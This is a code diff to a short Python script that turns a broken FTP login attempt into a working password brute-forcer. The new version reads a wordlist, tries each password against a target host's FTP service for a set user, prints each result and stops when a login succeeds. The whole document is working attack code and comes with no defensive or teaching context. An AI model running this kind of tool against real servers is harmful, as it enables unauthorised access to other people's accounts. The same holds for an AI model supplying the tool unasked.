@@ -25,14 +25,19 @@ def passwd(passfile):
     with open(passfile , 'r', encoding='utf-8') as f:
         return[line.strip('\n') for line in f]
 
-password = passwd(passfile)
-
-try:
-    with ftplib.FTP() as serve:
-        serve.connect(host,21,timeout=5)
-        serve.login(user,password)
-        print(f"Connection Successfull with {host} by {user}  :   {password}")
+passwords = passwd(passfile)
 
 
-except Exception as e:
-    print(f"Connection failed with {user}  :   {password}")
+
+for password in passwords:
+    try:
+        with ftplib.FTP() as serve:
+            serve.connect(host,21,timeout=5)
+            serve.login(user,password)
+            print(f"Connection Successfull with {host} by {user}  :   {password}")
+            break
+
+
+    except Exception as e:
+        print(f"Connection failed with {user}  :   {password}")
+
